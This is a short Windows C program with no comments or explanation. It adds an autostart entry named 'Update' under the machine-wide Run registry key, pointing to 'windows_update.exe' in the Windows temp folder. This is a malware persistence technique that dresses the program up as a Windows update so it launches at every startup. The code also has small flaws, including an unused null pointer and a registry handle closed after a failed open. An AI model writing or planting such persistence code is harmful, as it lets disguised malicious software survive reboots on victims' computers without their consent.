#include<windows.h>
#include<stdio.h>
int main(){
    char* number = 0x00000000; 
    HKEY key;
    const char *path = "C:\\Windows\\Temp\\windows_update.exe";
    LSTATUS rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_SET_VALUE, &key);
    if(ERROR_SUCCESS != rc){
        printf("RegOpenKeyEx failed: %u\n", GetLastError());
        RegCloseKey(key);
        return -1;
    }

    rc = RegSetValueEx(key, TEXT("Update"), 0, REG_SZ, (const BYTE*)path, (lstrlen(path)+1) * sizeof(TCHAR));
    if(ERROR_SUCCESS != rc){
        printf("RegSetValueExA failed: %u\n", GetLastError());
        RegCloseKey(key);
        return -1;
    }  

}